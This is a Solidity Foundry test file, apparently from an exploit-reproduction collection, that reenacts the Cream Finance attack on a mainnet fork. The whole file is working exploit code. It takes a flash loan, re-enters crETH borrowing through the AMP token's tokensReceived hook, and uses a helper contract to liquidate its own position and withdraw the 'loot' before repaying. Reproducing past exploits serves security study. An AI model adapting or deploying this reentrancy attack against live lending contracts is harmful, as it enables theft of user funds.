// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";
import {TokenBalanceTracker} from "../../modules/TokenBalanceTracker.sol";

import {IERC20} from "../../interfaces/IERC20.sol";
import {IWETH9} from "../../interfaces/IWETH9.sol";

import {IUniswapV2Pair} from "../../utils/IUniswapV2Pair.sol";

interface IERC1820Registry {
    function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

interface IcrToken {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function balanceOf(address _of) external view returns (uint256);
    function decimals() external view returns (uint16);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral)
        external
        returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns (uint256[] memory);
    function exitMarket(address market) external;

    // Borrow caps enforced by borrowAllowed for each cToken address. Defaults to zero which corresponds to
    // unlimited borrowing.
    function borrowCaps(address market) external view returns (uint256);
}

contract Exploit_CreamFinance is TestHarness, TokenBalanceTracker {
    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    IUniswapV2Pair internal wiseWethPair = IUniswapV2Pair(0x21b8065d10f73EE2e260e5B47D3344d3Ced7596E);

    IUnitroller internal comptroller = IUnitroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);

    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IcrToken crAmp = IcrToken(0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6);
    IcrToken crEth = IcrToken(0xD06527D5e56A3495252A528C4987003b712860eE);
    IERC20 amp = IERC20(0xfF20817765cB7f73d4bde2e66e067E58D11095C2);

    bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =
        0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;

    function setUp() external {
        cheat.createSelectFork(vm.envString("RPC_URL"), 13125070); // fork mainnet at block 13125070

        cheat.deal(address(this), 0);

        addTokenToTracker(address(weth));
        addTokenToTracker(address(amp));
        addTokenToTracker(address(crAmp));
        addTokenToTracker(address(crEth));

        console.log("===== INITIAL BALANCES =====");
        logBalancesWithLabel("Attacker Contract", address(this));
    }

    function test_attack() external {
        console.log("===== STEP 1: INCLUDE THE ATTACKER CONTRACT IN THE INTERFACE REGISTY =====");

        uint256 balanceBeforeWETH = weth.balanceOf(address(this));
        uint256 balanceBeforeAMP = amp.balanceOf(address(this));

        interfaceRegistry.setInterfaceImplementer(
            address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)
        );

        console.log("===== STEP 2: REQUEST FLASHLOAN =====");
        wiseWethPair.swap(0, 500 ether, address(this), "0x00");

        /*
            Continues in the uniswapV2Call callback
        */

        console.log("===== STEP 16: Withdraw Loot =====");
        weth.transfer(msg.sender, weth.balanceOf(address(this)));
        amp.transfer(msg.sender, amp.balanceOf(address(this)));

        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Attacker EOA", msg.sender);

        uint256 balanceAfterWETH = weth.balanceOf(address(this));
        uint256 balanceAfterAMP = amp.balanceOf(address(this));
        assertGe(balanceAfterWETH, balanceBeforeWETH);
        assertGe(balanceAfterAMP, balanceBeforeAMP);
    }

    function uniswapV2Call(address sender, uint256, /* /wiseLoanAmt */ uint256 wethLoanAmt, bytes calldata)
        external
    {
        require(msg.sender == address(wiseWethPair), "Only callable by pair");
        require(sender == address(this), "Only requested by this");

        console.log("===== STEP 3: INSIDE FLASHLOAN =====");
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 4: GET ETH FROM WETH =====");
        weth.approve(address(crAmp), type(uint256).max);
        weth.withdraw(weth.balanceOf(address(this)));
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 5: Mint crETH tokens =====");
        crEth.mint{value: address(this).balance}();
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 6: Enter Markets in Comptroller =====");
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(crEth);
        comptroller.enterMarkets(cTokens);

        console.log("===== STEP 7: Perform first borrow =====");
        crAmp.borrow(19_480_000_000_000_000_000_000_000);
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 9: Deploy Minion Contract =====");
        ExploiterMinion minionOne = new ExploiterMinion{salt: bytes32(0)}();
        // Transfers the 50% of AMP tokens to the minion
        amp.transfer(address(minionOne), amp.balanceOf(address(this)) * 5 / 10);
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Minion Contract", address(minionOne));

        console.log("===== STEP 10: Minion Liquidates Commander =====");
        minionOne.liquidateAMPBorrow();
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Minion Contract", address(minionOne));

        console.log("===== STEP 11: Minion Redeems Liquidation Prize =====");
        minionOne.redeemLiquidationPrize();
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Minion Contract", address(minionOne));

        console.log("===== STEP 12: Minion Sends WETH to Commander =====");
        minionOne.depositAndTransferWeth();
        logBalancesWithLabel("Attacker Contract", address(this));
        logBalancesWithLabel("Minion Contract", address(minionOne));

        console.log("===== STEP 13: Selfdestruct Minion =====");
        minionOne.selfDestructMinion();

        console.log("===== STEP 14: Deposit ETH for WETH =====");
        weth.deposit{value: address(this).balance}();
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 15: Repay WETH Flashloan =====");
        uint256 amountToRepay = wethLoanAmt * 1000 / 997 + 1;
        weth.transfer(address(wiseWethPair), amountToRepay);
        logBalancesWithLabel("Attacker Contract", address(this));
    }

    // AMP Tokens Callback (hook)
    function tokensReceived(bytes4, bytes32, address, address, address, uint256, bytes memory, bytes memory)
        external
    {
        logBalancesWithLabel("Attacker Contract", address(this));

        console.log("===== STEP 8: Borrow on crETH reentering =====");
        crEth.borrow(355 ether);
    }

    receive() external payable {
        // Could continue here with step 5 after step 4 or directly in the callback.
    }
}

contract ExploiterMinion {
    IERC1820Registry internal interfaceRegistry = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    bytes32 constant TOKENS_RECIPIENT_INTERFACE_HASH =
        0xfa352d6368bbc643bcf9d528ffaba5dd3e826137bc42f935045c6c227bd4c72a;

    address internal commanderContract;

    IWETH9 weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IcrToken crAmp = IcrToken(0x2Db6c82CE72C8d7D770ba1b5F5Ed0b6E075066d6);
    IcrToken crEth = IcrToken(0xD06527D5e56A3495252A528C4987003b712860eE);
    IERC20 amp = IERC20(0xfF20817765cB7f73d4bde2e66e067E58D11095C2);

    constructor() {
        // Because no setter calls are performed on this contract before transfer, the interface registry is
        // setup on construction.
        interfaceRegistry.setInterfaceImplementer(
            address(this), TOKENS_RECIPIENT_INTERFACE_HASH, address(this)
        );
        commanderContract = msg.sender;
    }

    modifier onlyCommander() {
        require(msg.sender == commanderContract, "Only Commander");
        _;
    }

    function liquidateAMPBorrow() external onlyCommander {
        amp.approve(address(crAmp), type(uint256).max);
        crAmp.liquidateBorrow(commanderContract, amp.balanceOf(address(this)), address(crEth)); // Liquidate
            // the other half
    }

    function redeemLiquidationPrize() external onlyCommander {
        crEth.redeem(crEth.balanceOf(address(this)));
    }

    function depositAndTransferWeth() external onlyCommander {
        weth.deposit{value: address(this).balance}();
        require(
            weth.transfer(commanderContract, weth.balanceOf(address(this))),
            "Failed to send WETH to Commander"
        );
    }

    function selfDestructMinion() external onlyCommander {
        selfdestruct(payable(commanderContract));
    }

    function tokensReceived(bytes4, bytes32, address, address, address, uint256, bytes memory, bytes memory)
        external
    {}

    receive() external payable {}
}
